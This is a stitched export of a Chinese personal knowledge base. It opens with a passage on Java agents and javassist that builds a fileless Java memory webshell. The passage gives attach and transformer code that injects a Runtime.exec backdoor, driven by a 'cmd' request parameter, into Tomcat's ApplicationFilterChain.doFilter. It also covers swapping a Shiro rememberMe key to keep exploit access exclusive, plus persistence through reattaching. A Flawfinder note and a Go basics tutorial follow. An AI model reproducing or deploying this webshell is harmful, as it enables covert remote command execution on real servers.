使用Instrumentation.addTransformer()来加载一个转换器。 转换器的返回结果（transform()方法的返回值）将成为转换后的字节码。 对于没有加载的类，会使用ClassLoader.defineClass()定义它；对于已经加载的类，会使用ClassLoader.redefineClasses()重新定义，并配合Instrumentation.retransformClasses进行转换。 现在已经知道了怎样能修改Class的字节码，具体的做法还需要用到另一个类库javassist来获取字节码，不了解的可以网上找文章了解下，可以简单理解为：通过这个类库可以直接创建一个class字节码文件 javassist 因为我们的目的只是修改某个类的某个方法，所以着重介绍下CtMethod，其他需要的简单过一下 依赖 org.javassist javassist 3.28.0-GA ClassPool 这个类是javassist的核心组件之一。 来看一下官方对他的介绍： ClassPool是CtClass对象的容器。CtClass对象必须从该对象获得。如果get()在此对象上调用，则它将搜索表示的各种源ClassPath 以查找类文件，然后创建一个CtClass表示该类文件的对象。创建的对象将返回给调用者。 简单来说，这就是个容器，存放的是CtClass对象。 获得方法： ClassPool cp = ClassPool.getDefault();。通过 ClassPool.getDefault() 获取的 ClassPool 使用 JVM 的类搜索路径。如果程序运行在 JBoss 或者 Tomcat 等 Web 服务器上，ClassPool 可能无法找到用户的类，因为 Web 服务器使用多个类加载器作为系统类加载器。在这种情况下，ClassPool 必须添加额外的类搜索路径。 cp.insertClassPath(new ClassClassPath()); CtClass 可以把它理解成加强版的Class对象，需要从ClassPool中获得。 获得方法：CtClass cc = cp.get(ClassName)。 CtMethod 同理，可以理解成加强版的Method对象。 获得方法：CtMethod m = cc.getDeclaredMethod(MethodName)。 这个类提供了一些方法，使我们可以便捷的修改方法体： public final class CtMethod extends CtBehavior { // 主要的内容都在父类 CtBehavior 中 } // 父类 CtBehavior public abstract class CtBehavior extends CtMember { // 设置方法体 public void setBody(String src); // 插入在方法体最前面 public void insertBefore(String src); // 插入在方法体最后面 public void insertAfter(String src); // 在方法体的某一行插入内容 public int insertAt(int lineNum, String src); } 传递给方法 insertBefore() ，insertAfter() 和 insertAt() 的 String 对象是由Javassist 的编译器编译的。 由于编译器支持语言扩展，以 $ 开头的几个标识符有特殊的含义： 符号 含义 $0, $1, $2, ... $0 = this; $1 = args[1] ..... $args 方法参数数组.它的类型为 Object[] $$ 所有实参。例如, m($$) 等价于 m($1,$2,...) $cflow(...) cflow 变量 $r 返回结果的类型，用于强制类型转换 $w 包装器类型，用于强制类型转换 $_ 返回值 详细的内容可以看Javassist 使用指南（二）。 示例 举例说明一下是如何动态修改类字节码的 先说2个注意点： 如果在使用过程中找不到javassist包中的类（因为目标环境也需要这个类库，不然会找不到Class），那么可以使用URLCLassLoader+反射的方式调用 需要在agent.jar中的MANIFEST.MF中添加Can-Retransform-Classes: true，不然会抛出异常UnmodifiableClassException 被动态修改的类源码，其中Hello类的hello方法是我们要动态修改的目标，用Scanner是为了保证程序不停止，给我们留有操作的时间 // Main.java import java.util.Scanner; public class Main { public static void main(String[] args) { Hello h1 = new Hello(); h1.hello(); System.out.println(\"等待输入...\"); new Scanner(System.in).next(); Hello h2 = new Hello(); h2.hello(); } } // Hello.java public class Hello { public void hello(){ System.out.println(\"hello world\"); } } 运行并获取pid（69484） attach代码还是差不多，主要是给agent.jar附加进去 import com.sun.tools.attach.AgentInitializationException; import com.sun.tools.attach.AgentLoadException; import com.sun.tools.attach.AttachNotSupportedException; import com.sun.tools.attach.VirtualMachine; import java.io.IOException; public class Attach { public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException { // 列出所有的jvm System.out.println(VirtualMachine.list()); String pid = \"69484\"; String jarName = \"/Users/d4m1ts/d4m1ts/java/javaagent/out/artifacts/javaagent_jar/javaagent.jar\"; // 连接到JVM VirtualMachine virtualMachine = VirtualMachine.attach(pid); // 加载agentmain virtualMachine.loadAgent(jarName); // 断开连接 virtualMachine.detach(); System.out.println(\"ends\"); } } AgentMain（主要是添加Transformer和触发Transformer） // AgentMain.java import java.lang.instrument.Instrumentation; import java.lang.instrument.UnmodifiableClassException; public class AgentMain { public static void agentmain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException { Class[] allLoadedClasses = inst.getAllLoadedClasses(); for (Class cls : allLoadedClasses){ // 定位到类 if (cls.getName() == TransformerDemo.editClassName){ // 添加Transformer inst.addTransformer(new TransformerDemo(), true); // 触发Transformer inst.retransformClasses(cls); } } } } // TransformerDemo.java import javassist.*; import java.io.IOException; import java.lang.instrument.ClassFileTransformer; import java.lang.instrument.IllegalClassFormatException; import java.security.ProtectionDomain; // addTransformer()的第一个参数需要ClassFileTransformer这个类的对象 public class TransformerDemo implements ClassFileTransformer { public static String editClassName = \"Hello\"; public static String editMethod = \"hello\"; @Override public byte[] transform(ClassLoader loader, String className, Class classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException { ClassPool classPool = ClassPool.getDefault(); // 添加额外的类搜索路径 if (classBeingRedefined != null){ ClassClassPath classClassPath = new ClassClassPath(classBeingRedefined); classPool.insertClassPath(classClassPath); } // 修改方法hello()，返回 byte[] 字节码 try { CtClass ctClass = classPool.get(editClassName); CtMethod ctMethod = ctClass.getDeclaredMethod(editMethod); String modifySource = \"System.out.println(\\\"TransformerDemo attached\\\");\"; ctMethod.setBody(modifySource); byte[] bytes = ctClass.toBytecode(); ctClass.detach(); return bytes; } catch (NotFoundException e) { e.printStackTrace(); } catch (CannotCompileException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } return new byte[0]; } } 结果，可以看到第二次执行hello()方法时发现该方法被动态的修改了 内存马 既然现在已经能够修改方法体了，那就可以将木马放到某个一定会执行的方法内，这样的话，当访问任意路由的时候，就会调用木马。那么现在的问题就变成了，注入到哪一个类的哪个方法比较好。 众所周知，Spring boot 中内嵌了一个embed Tomcat作为容器，而在网上流传着很多版本的 Tomcat“无文件”内存马。这些内存马大多数都是通过重写/添加Filter来实现的。既然Spring boot 使用了Tomcat，那么能不能照葫芦画瓢，通过Filter，实现一个Spring boot的内存马呢？当然是可以的。 Spring Boot的Filter 给写的Controller下个断点，可以看到执行到controller的时候，会经过很多的doFilter和internalDoFilter方法，它们大多来自于ApplicationFilterChain这个类。 看看ApplicationFilterChain的doFilter方法： @Override public void doFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException { if( Globals.IS_SECURITY_ENABLED ) { final ServletRequest req = request; final ServletResponse res = response; try { java.security.AccessController.doPrivileged( new java.security.PrivilegedExceptionAction() { @Override public Void run() throws ServletException, IOException { internalDoFilter(req,res); return null; } } ); } catch (PrivilegedActionException pe) { ...... } } else { internalDoFilter(request,response); } } 乍一看内容挺多，其实总结下来就是调用this.internalDoFilter()。所以再来简单看一下internalDoFilter()方法： private void internalDoFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException { // Call the next filter if there is one if (pos 这两个个方法拥有Request和Response参数。如果能重写其中一个，那就能控制所有的请求和响应！因此，用来作为内存马的入口点简直完美。这里我选择doFilter()方法，具体原因会在之后提到。 Java agent修改doFilter 注意: 每次attach之前，需要访问一下spring的web页面，要让Spring Initializing Spring DispatcherServlet 'dispatcherServlet'，加载一下需要的类，不然不会attach成功，因为找不到我们要修改的类，所以也找不到方法，也就无法修改成功 shell中所有类都要用全称，比如java.io.InputStream，不然可能会抛出异常 如果是完全替代方法，记得用{}包裹 可能会出现各种java.lang.NoClassDefFoundError的问题，跟一下这个断点，就会发现缺少各种各样的class文件，跟了一下，发现可能是动态修改字节码后，整个类的class都会出现异常，太离谱了，也不知道网上的大哥们为啥没遇到 接上一个问题，动态修改过的class文件反编译后代码是没问题的，但是还是不知道为啥解决不了找不到类定义的问题 对刚才的agent代码稍微修改即可（实在重写不了doFilter方法了，分析了几天，重写了class就算代码没问题，也会出现java.lang.NoClassDefFoundError的问题） 并且这里为了不破坏原来的方法结构，我们不用CtMethod的setSource，而是用insertBefore方法 AgentMain.java // AgentMain.java import java.lang.instrument.Instrumentation; import java.lang.instrument.UnmodifiableClassException; public class AgentMain { public static void agentmain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException { Class[] allLoadedClasses = inst.getAllLoadedClasses(); for (Class cls : allLoadedClasses){ // 定位到类 if (cls.getName() == TransformerDemo.editClassName){ // 添加Transformer inst.addTransformer(new TransformerDemo(), true); // 触发Transformer inst.retransformClasses(cls); } } } } // TransformerDemo.java import javassist.*; import java.io.IOException; import java.lang.instrument.ClassFileTransformer; import java.lang.instrument.IllegalClassFormatException; import java.security.ProtectionDomain; // addTransformer()的第一个参数需要ClassFileTransformer这个类的对象 public class TransformerDemo implements ClassFileTransformer { public static String editClassName = \"org.apache.catalina.core.ApplicationFilterChain\"; public static String editMethod = \"doFilter\"; public static String memshell = \"\" + \" javax.servlet.http.HttpServletRequest req = $1;\\n\" + \" javax.servlet.http.HttpServletResponse res = $2;\\n\" + \" java.lang.String cmd = req.getParameter(\\\"cmd\\\");\\n\" + \"\\n\" + \" if (cmd != null){\\n\" + \" System.out.println(cmd);\" + \" try {\\n\" + \" java.lang.Runtime.getRuntime().exec(cmd);\\n\" + \" } catch (Exception e){\\n\" + \" e.printStackTrace();\\n\" + \" }\\n\" + \" }\\n\" + \" else{\\n\" + \" internalDoFilter(req,res);\\n\" + \" }\\n\" + \"\"; @Override public byte[] transform(ClassLoader loader, String className, Class classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException { ClassPool classPool = ClassPool.getDefault(); // 添加额外的类搜索路径 if (classBeingRedefined != null) { ClassClassPath classClassPath = new ClassClassPath(classBeingRedefined); classPool.insertClassPath(classClassPath); } // 修改方法doFilter()，返回 byte[] 字节码 try { CtClass ctClass = classPool.get(editClassName); CtMethod ctMethod = ctClass.getDeclaredMethod(editMethod); ctMethod.insertBefore(memshell); ctClass.writeFile(\"/Users/d4m1ts/d4m1ts/java/Temp/out/artifacts/temp_jar\"); System.out.println(memshell); System.out.println(\"injection success\"); byte[] bytes = ctClass.toBytecode(); ctClass.detach(); return bytes; } catch (NotFoundException e) { e.printStackTrace(); } catch (CannotCompileException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } return new byte[0]; } } 给上面的打包成agent.jar，然后通过虚拟机attach到spring jvm中，再执行命令即可（理论上是可以的，网上的文章也都可以成功，但我实在是调不出来为啥了） 拓展操作 通过加载agent可以修改很多类的字节码，所以利用起来操作的空间也很大，不仅仅是内存马这一个点。 一个比较多的利用方法，就是修改shiro的key，这样可以让这个漏洞仅自己可用，避免共享目标权限 重点： 在解析rememberMe的时候，先将其base64解码，然后使用AES解密，在AES解密的时候，会调用org.apache.shiro.mgt.AbstractRememberMeManager#getDecryptionCipherKey()，更改掉这个函数的返回值，就可以更改解密的密钥。 // 使用insertBefore() $0.setCipherKey(org.apache.shiro.codec.Base64.decode(\"4AvVhmFLUs0KTA3Kprsdag==\")); // 使用setBody() return (org.apache.shiro.codec.Base64.decode(\"4AvVhmFLUs0KTA3Kprsdag==\")); 查杀 agent 内存马相比 filter 内存马，会多一步就是我们需要将我们自己的 agent.jar 传到目标上，然后利用代码将 agent.jar 进行注入，注入之后我们就可以将 agent.jar 进行删除，agent 内存马相比 filter 这些内存马相对更难查杀一些 基于javaAgent内存马检测查杀指南 风险 注入agent内存马后，可能存在我上面那种整个网站崩溃的情况；网上有说可能是因为虚拟内存不够了而导致的，但是我设置大了虚拟内存还是不行。。。 所以实战中尽量还是用API型的内存马 内存马复活 换个说法，如何防止内存马重启后失效； 其实也很简单，就是在jvm关闭前，把attach.jar和agentMain.jar都写到磁盘上，然后无限调用attach.jar尝试attach到jvm中； 但是这样感觉更容易被发现了，所谓有得必有失吧emmm 总览 Java Agent 从入门到内存马 浅谈 Java Agent 内存马 Java Agent实现反序列化注入内存shell Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:52:02 "},"个人知识库/02.代码审计/02.C:C++/01.工具Flawfinder.html":{"url":"个人知识库/02.代码审计/02.C:C++/01.工具Flawfinder.html","title":"01.工具Flawfinder","keywords":"","body":" 前言 开始 使用 其他 前言 审计C/C++的时候，我们一般也会使用fortify先进行扫描，但是问题存在于，如果fortify的配置存在问题，那么扫描是不会有任何结果的，如下显示灰色 所以推荐在做C/C++的代码审计的时候可以尝试一下其他的工具进行扫描如Flawfinder 开始 安装过程很简单，文档也都有说明 pip install flawfinder # 下面这个是给文件进行格式转换，防止flawfinder因为格式原因不能继续扫描文件异常 pip install cvt2utf cvt2utf convert src -i c 使用 以github开源的HAWQ为例：https://github.com/apache/hawq 使用也很简单，毕竟还是需要结合人工来看 查看帮助 flawfinder -h 原生格式保存为csv flawfinder src > res.csv 保存为html flawfinder --html --context --minlevel=4 backend > output.html 其他 C/C++代碼靜態分析工具調研 Automated Audit Example: flawfinder Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-30 18:19:32 "},"个人知识库/03.编程开发/GO/01.GO入门基础.html":{"url":"个人知识库/03.编程开发/GO/01.GO入门基础.html","title":"01.GO入门基础","keywords":"","body":" 介绍 Hello World GO语言基础 工作空间 环境变量 包路径 包名 包文档 代码结构 代码编译运行 快速运行 安装到本地 远程下载并编译 交叉编译 代码测试 GO标记 标识符 关键字 行分隔符; 注释 字符串连接 格式化字符串 数据类型 数字类型 浮点型 其他数字类型 值类型和引用类型 GO开发基础 声明变量 声明常量 运算符 算术运算符 关系运算符 逻辑运算符 位运算符 赋值运算符 其他运算符 运算符优先级 空白标识符 格式化输出 条件语句 if if...else if...else if...else switch select 循环语句 for for each 无限循环 循环控制 init函数 自定义函数 构造函数与复合字面 作用域 局部变量 全局变量 数组 初始化数组 访问数组 指针 使用指针 空指针 指针数组 结构体 定义结构体 访问成员 结构体作为参数 结构体指针 切片 定义切片 初始化切片 空(nil)切片 切片截取 len()和cap()函数 追加元素 append()和copy()函数 集合(Map) 定义Map 删除元素 范围(Range) 类型转换 递归 阶乘实例 斐波那契数列实例 接口 声明接口 实现接口 new和make new make defer 并发 go程 通道（channel） 通道缓冲区 注意事项 遍历通道 关闭通道 异常处理 生成error Panic异常 恢复 介绍 Go语言(Golang)最初是由Robert Griesemer, Rob Pike, 和 Ken Thompson在谷歌于2007年开发出来的编程语言。Go编程语言是静态类型语言，语法类似于C语言，它提供了垃圾收集，类型安全，动态的输入能力，还有很多先进的内置类型，例如，可变长度数组和映射（键-值对）。它还提供了丰富的标准库。 Go编程语言是在2009年11月正式对外发布，主要是应用谷歌的于一些生产系统链中。 Hello World package main import \"fmt\" func main() { fmt.Println(\"HELLO WORLD\") } go run Hello.go GO语言基础 工作空间 go工具为公共代码仓库中维护的开源代码而设计。 无论会不会公布代码，该模型设置工作环境的方法都是相同的。 Go代码必须放在工作空间内。它其实就是一个目录，其中包含三个子目录： src 目录包含Go的源文件，它们被组织成包（每个目录都对应一个包） pkg 目录包含包对象 bin 目录包含可执行命令 go 工具用于构建src目录中的源码包，并将其生成的二进制文件安装到 pkg 和 bin 目录中。 src 子目录通常包会含多种版本控制的代码仓库（例如Git或Mercurial）， 以此来跟踪一个或多个源码包的开发。 结构举例如下： bin/ hello # 可执行命令 pkg/ linux_amd64/ # 这里会反映出你的操作系统和架构 github.com/user/ stringutil.a # 包对象 src/ github.com/user/ hello/ hello.go # 命令源码 stringutil/ reverse.go # 包源码 环境变量 go env 而 GOPATH 环境变量指定了你的工作空间位置，这也是很重要的一个变量。 首先创建一个工作空间目录，并设置相应的 GOPATH，工作空间可以放在任何地方，我们使用 $HOME/go。 注意，它绝对不能和你的Go安装目录相同。（另一种常见的设置是 GOPATH=$HOME。） 设置GOPATH export GOPATH=$HOME/go 然后将bin添加到环境变量中 export PATH=$PATH:$GOPATH/bin 包路径 标准库中的包有给定的短路径，比如 \"fmt\" 和 \"net/http\"。 对于你自己的包，你必须选择一个基本路径，来保证它不会与将来添加到标准库， 或其它扩展库中的包相冲突。 如果你将你的代码放到了某处的源码库，那就应当使用该源码库的根目录作为你的基本路径。 例如，若你在 GitHub 上有账户 github.com/user 那么它就应该是你的基本路径。 我们将使用 github.com/user 作为基本路径。在你的工作空间里创建一个目录， 我们将源码存放到其中： mkdir -p $GOPATH/src/github.com/user 包名 源文件中的第一个语句必须是 package 名称 这里的 名称 即为导入该包时使用的默认名称。 （一个包中的所有文件都必须使用相同的 名称。） Go的约定是包名为导入路径的最后一个元素：作为 “crypto/rot13” 导入的包应命名为 rot13。 可执行命令必须使用 package main。 链接成单个二进制文件的所有包，其包名无需是唯一的，只有导入路径（它们的完整文件名） 才是唯一的。 包文档 1、使用命令go doc go doc fmt.Println 2、另一种比较常用的方式，是直接进去包内查看源码 代码结构 Go 语言的基础组成有以下几个部分： 包声明 引入包 函数 变量 语句 & 表达式 注释 以上面的hello world代码为例 package main // 定义了包名。必须在源文件中非注释的第一行指明这个文件属于哪个包，如：package main。package main表示一个可独立执行的程序，每个 Go 应用程序都包含一个名为 main 的包。 import \"fmt\" // 引用fmt包（的函数，或其他元素），fmt 包实现了格式化 IO（输入/输出）的函数 func main() { // 程序开始执行的函数。main 函数是每一个可执行程序所必须包含的，一般来说都是在启动后第一个执行的函数（如果有 init() 函数则会先执行该函数） fmt.Println(\"HELLO WORLD\") // 调用fmt包中的函数，将字符串输出到控制台，并在最后自动增加换行字符 \\n } 其他： //开头的为单行注释，/*开头，并以*/结尾为多行注释 当标识符（包括常量、变量、类型、函数名、结构字段等等）以一个大写字母开头，如：Group1，那么使用这种形式的标识符的对象就可以被外部包的代码所使用（客户端程序需要先导入这个包），这被称为导出（像面向对象语言中的 public）；标识符如果以小写字母开头，则对包外是不可见的，但是他们在整个包的内部是可见并且可用的（像面向对象语言中的 protected ） 函数名首字母小写即为 protected :func getId() {} 函数名首字母大写即为 public : func Printf() {} 代码编译运行 创建目录/Users/d4m1ts/go/src/github.com/damit5/goTest，并编写代码Hello.go，代码如上 快速运行 编写完成代码后，有两种方法可以快速运行 一种是直接动态运行 go run xxx.go 另一种则是先编译成二进制文件再手动执行 go build xxx.go 安装到本地 还有一种方法可以安装到本地，简单来说就是生成二进制文件并且放到bin目录下，如果在项目目录中就直接go install即可，在其他路径则需要带上src后的路径 go install go install github.com/damit5/goTest 无论是安装包还是二进制文件，go 工具都会安装它所依赖的任何东西 如果提示go: go.mod file not found in current directory or any parent directory; see 'go help modules'，说明需要初始化项目，执行 go mod init {项目名} 然后就可以用go install了，生成后的二进制文件自动存放在bin目录中 远程下载并编译 前提是提前上传到github中 若指定的包不在工作空间中，go get就会将会将它放到 GOPATH 指定的第一个工作空间内。（若该包已存在，go get 就会跳过远程获取， 其行为与 go install 相同） go get github.com/damit5/goTest go get -v github.com/damit5/goTest 交叉编译 CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_darwin CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_linux CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_win.exe 代码测试 Go拥有一个轻量级的测试框架，它由 go test 命令和 testing 包构成。 你可以通过创建一个名字以 _test.go 结尾的，包含名为 TestXXX 且签名为 func (t *testing.T) 函数的文件来编写测试。 测试框架会运行每一个这样的函数；若该函数调用了像 t.Error 或 t.Fail 这样表示失败的函数，此测试即表示失败。 实例： package main import ( \"fmt\" \"testing\" ) func sum(a int, b int) int { return a+b } func TestSum(t *testing.T) { a := 10 b := 20 c := sum(a, b) if c == a+b { fmt.Println(\"success\") } else { t.Errorf(\"error happends\") } } 代码编写后，使用如下命令即可测试 go test go test github.com/damit5/goTest GO标记 Go 程序可以由多个标记组成，可以是关键字，标识符，常量，字符串，符号。如以下 GO 语句由 6 个标记组成： fmt.Println(\"Hello, World!\") 6 个标记是(每行一个)： fmt . Println ( \"Hello, World!\" ) 标识符 标识符用来命名变量、类型等程序实体。一个标识符实际上就是一个或是多个字母( A ~ Z 和 a ~ z)数字(0~9)、下划线_组成的序列，但是第一个字符必须是字母或下划线而不能是数字。 关键字 下面列举了 Go 代码中会使用到的 25 个关键字或保留字： break default func interface select case defer go map struct chan else goto package switch const fallthrough if range type continue for import return var 除了以上介绍的这些关键字，Go 语言还有 36 个预定义标识符： append bool byte cap close complex complex64 complex128 uint16 copy false float32 float64 imag int int8 int16 uint32 int32 int64 iota len make new nil panic uint64 print println real recover string true uint uint8 uintptr 行分隔符; 在Go程序中，一行代表一个语句结束。每个语句不需要像 C 家族中的其它语言一样以分号 ; 结尾，因为这些工作都将由 Go 编译器自动完成。 如果你打算将多个语句写在同一行，它们则必须使用 ; 人为区分，但在实际开发中我们并不鼓励这种做法。 注释 注释不会被编译，每一个包应该有相关注释。 // 单行注释 /* 多行注释 */ 字符串连接 和大多数语言一样，连接通过+来实现 fmt.Println(\"HELLO WORLD\\t\" + \"d4m1ts\") 格式化字符串 Go 语言中使用 fmt.Sprintf 格式化字符串并赋值给新串 package main import \"fmt\" func main() { var keyword = \"world\" var name = \"d4m1ts\" var age = 18 var template = \"hello %s %s %d\" var sentence = fmt.Sprintf(template, keyword, name, age) fmt.Println(sentence) } // hello world d4m1ts 18 数据类型 序号 类型和描述 1 布尔型布尔型的值只可以是常量 true 或者 false。一个简单的例子：var b bool = true。 2 数字类型整型 int 和浮点型 float32、float64，Go 语言支持整型和浮点型数字，并且支持复数，其中位的运算采用补码。 3 字符串类型:字符串就是一串固定长度的字符连接起来的字符序列。Go 的字符串是由单个字节连接起来的。Go 语言的字符串的字节使用 UTF-8 编码标识 Unicode 文本。 4 派生类型: 包括：(a) 指针类型（Pointer）(b) 数组类型(c) 结构化类型(struct)(d) Channel 类型(e) 函数类型(f) 切片类型(g) 接口类型（interface）(h) Map 类型 数字类型 Go 也有基于架构的类型，例如：int、uint 和 uintptr。 序号 类型和描述 1 uint8 无符号 8 位整型 (0 到 255) 2 uint16 无符号 16 位整型 (0 到 65535) 3 uint32 无符号 32 位整型 (0 到 4294967295) 4 uint64 无符号 64 位整型 (0 到 18446744073709551615) 5 int8 有符号 8 位整型 (-128 到 127) 6 int16 有符号 16 位整型 (-32768 到 32767) 7 int32 有符号 32 位整型 (-2147483648 到 2147483647) 8 int64 有符号 64 位整型 (-9223372036854775808 到 9223372036854775807) 浮点型 序号 类型和描述 1 float32 IEEE-754 32位浮点型数 2 float64 IEEE-754 64位浮点型数 3 complex64 32 位实数和虚数 4 complex128 64 位实数和虚数 其他数字类型 以下列出了其他更多的数字类型： 序号 类型和描述 1 byte 类似 uint8 2 rune 类似 int32 3 uint 32 或 64 位 4 int 与 uint 一样大小 5 uintptr 无符号整型，用于存放一个指针 值类型和引用类型 值类型是单独记录在内存中的，每2个数据都是独立的，其中一个修改不会影响到另一个 引用类型记录的是指针地址，如果2个数据指向同一个地址，那么其中一个被修改了，另一个也会被修改 所有像 int、float、bool 和 string 这些基本类型都属于值类型，使用这些类型的变量直接指向存在内存中的值 当使用等号 = 将一个变量的值赋值给另一个变量时，如：j = i，实际上是在内存中将 i 的值进行了拷贝，可以通过 &i 来获取变量 i 的内存地址 而更复杂的数据通常会需要使用多个字，这些数据一般使用引用类型保存。 一个引用类型的变量 r1 存储的是 r1 的值所在的内存地址（数字），或内存地址中第一个字所在的位置 这个内存地址称之为指针，这个指针实际上也被存在另外的某一个值中。 同一个引用类型的指针指向的多个字可以是在连续的内存地址中（内存布局是连续的），这也是计算效率最高的一种存储形式；也可以将这些字分散存放在内存中，每个字都指示了下一个字所在的内存地址。 当使用赋值语句 r2 = r1 时，只有引用（地址）被复制。 如果 r1 的值被改变了，那么这个值的所有引用都会指向被修改后的内容，在这个例子中，r2 也会受到影响。 GO开发基础 声明变量 变量名由字母、数字、下划线组成，其中首个字符不能为数字。 声明变量的一般形式是使用 var 关键字： 语法： // 标准语法 var identifier type // 也可以同时声明多个变量 var identifier1, identifier2 type // 1. 指定变量类型，如果没有初始化，则变量默认为零值（没有做初始化时系统默认设置的值） var a int // 0 var b bool // false var c string // \"\" var a []int // nil // 2. 没有指定变量类型，则根据值自行判定变量类型 var d = true // 自动识别为bool // 3. 使用 := 可以快速声明变量 /* := 等价于 var name string; name = \"d4m1ts\" 这种格式只能在函数体中出现 */ name := \"d4m1ts\" // 4. 如果变量已经使用 var 声明过了，再使用 := 声明变量，就产生编译错误 var name = \"d4m1ts\" name := \"d4m1ts\" 单变量声明实例： var a,b int8 a = 1 b = 2 var name = \"d4m1ts\" name1 := \"d4m1ts\" 多变量声明实例： var a,b int = 1,2 c,d := 3,4 声明常量 常量是一个简单值的标识符，在程序运行时，不会被修改的量，一般形式是使用 const 关键字。 常量中的数据类型只可以是布尔型、数字型（整数型、浮点型和复数）和字符串型。 语法： 和变量一样，type可以省略 显式类型定义： const b string = \"abc\" 隐式类型定义： const b = \"abc\" const identifier [type] = value 定义实例： const j = 4 const i,j = 3,4 用作枚举： package main import ( \"fmt\" \"unsafe\" ) func main() { const ( a = \"abc\" b = len(a) c = unsafe.Sizeof(b) ) fmt.Println(c) } // 8 iota： 特殊常量，可以认为是一个可以被编译器修改的常量 iota 在 const关键字出现时将被重置为 0(const 内部的第一行之前)，const 中每新增一行常量声明将使 iota 计数一次(iota 可理解为 const 语句块中的行索引)。 package main import \"fmt\" func main() { const ( a = iota //0 b //1 c //2 d = \"ha\" //独立值，iota += 1 e //\"ha\" iota += 1 f = 100 //iota +=1 g //100 iota +=1 h = iota //7,恢复计数 i //8 ) fmt.Println(a,b,c,d,e,f,g,h,i) } // 0 1 2 ha ha 100 100 7 8 运算符 算术运算符 下表列出了所有Go语言的算术运算符。假定 A 值为 10，B 值为 20。 运算符 描述 实例 + 相加 A + B 输出结果 30 - 相减 A - B 输出结果 -10 * 相乘 A * B 输出结果 200 / 相除 B / A 输出结果 2 % 求余 B % A 输出结果 0 ++ 自增 A++ 输出结果 11 -- 自减 A-- 输出结果 9 关系运算符 下表列出了所有Go语言的关系运算符。假定 A 值为 10，B 值为 20。 运算符 描述 实例 == 检查两个值是否相等，如果相等返回 True 否则返回 False。 (A == B) 为 False != 检查两个值是否不相等，如果不相等返回 True 否则返回 False。 (A != B) 为 True > 检查左边值是否大于右边值，如果是返回 True 否则返回 False。 (A > B) 为 False 检查左边值是否小于右边值，如果是返回 True 否则返回 False。 (A >= 检查左边值是否大于等于右边值，如果是返回 True 否则返回 False。 (A >= B) 为 False 检查左边值是否小于等于右边值，如果是返回 True 否则返回 False。 (A 逻辑运算符 下表列出了所有Go语言的逻辑运算符。假定 A 值为 True，B 值为 False。 运算符 描述 实例 && 逻辑 AND 运算符。 如果两边的操作数都是 True，则条件 True，否则为 False。 (A && B) 为 False \\ \\ 逻辑 OR 运算符。 如果两边的操作数有一个 True，则条件 True，否则为 False。 (A \\ \\ B) 为 True ! 逻辑 NOT 运算符。 如果条件为 True，则逻辑 NOT 条件 False，否则为 True。 !(A && B) 为 True 位运算符 位运算符对整数在内存中的二进制位进行操作。 下表列出了位运算符 &, |, 和 ^ 的计算： p q p & q p \\ q p ^ q 0 0 0 0 0 0 1 0 1 1 1 1 1 1 0 1 0 0 1 1 Go 语言支持的位运算符如下表所示。假定 A 为60，B 为13： 运算符 描述 实例 & 按位与运算符\"&\"是双目运算符。 其功能是参与运算的两数各对应的二进位相与。 (A & B) 结果为 12, 二进制为 0000 1100 \\ 按位或运算符\"\\ \"是双目运算符。 其功能是参与运算的两数各对应的二进位相或 (A \\ B) 结果为 61, 二进制为 0011 1101 ^ 按位异或运算符\"^\"是双目运算符。 其功能是参与运算的两数各对应的二进位相异或，当两对应的二进位相异时，结果为1。 (A ^ B) 结果为 49, 二进制为 0011 0001 左移运算符\" A >> 右移运算符\">>\"是双目运算符。右移n位就是除以2的n次方。 其功能是把\">>\"左边的运算数的各二进位全部右移若干位，\">>\"右边的数指定移动的位数。 A >> 2 结果为 15 ，二进制为 0000 1111 赋值运算符 下表列出了所有Go语言的赋值运算符。 运算符 描述 实例 = 简单的赋值运算符，将一个表达式的值赋给一个左值 C = A + B 将 A + B 表达式结果赋值给 C += 相加后再赋值 C += A 等于 C = C + A -= 相减后再赋值 C -= A 等于 C = C - A *= 相乘后再赋值 C = A 等于 C = C A /= 相除后再赋值 C /= A 等于 C = C / A %= 求余后再赋值 C %= A 等于 C = C % A 左移后赋值 C >>= 右移后赋值 C >>= 2 等于 C = C >> 2 &= 按位与后赋值 C &= 2 等于 C = C & 2 ^= 按位异或后赋值 C ^= 2 等于 C = C ^ 2 \\ = 按位或后赋值 C \\ = 2 等于 C = C \\ 2 其他运算符 下表列出了Go语言的其他运算符。 运算符 描述 实例 & 返回变量存储地址 &a; 将给出变量的实际地址。 * 指针变量。 *a; 是一个指针变量 运算符优先级 有些运算符拥有较高的优先级，二元运算符的运算方向均是从左至右。下表列出了所有运算符以及它们的优先级，由上至下代表优先级由高到低： 优先级 运算符 5 * / % > & &^ 4 + - \\ ^ 3 == != >= 2 && 1 \\ \\ 空白标识符 用 _ 可以代表被丢弃的值，避免一些变量因为没使用导致程序报错 实例： 变量j必须使用，否则会报错 package main import \"fmt\" func main() { a := [] int {1,2,3,4,5} for j,i := range a { fmt.Println(j, i) } } 使用_来丢弃上面的j变量 package main import \"fmt\" func main() { a := [] int {1,2,3,4,5} for _,i := range a { fmt.Println(i) } } 格式化输出 Go采用的格式化打印风格和C的 printf 族类似，但却更加丰富而通用。 这些函数位于 fmt 包中，且函数名首字母均为大写：如 fmt.Printf、fmt.Fprintf，fmt.Sprintf 等。 字符串函数（Sprintf 等）会返回一个字符串，而非填充给定的缓冲区。 常见格式 var t interface{} t = functionOfSomeType() switch t := t.(type) { default: fmt.Printf(\"unexpected type %T\", t) // %T 输出 t 是什么类型 case bool: fmt.Printf(\"boolean %t\\n\", t) // t 是 bool 类型 case int: 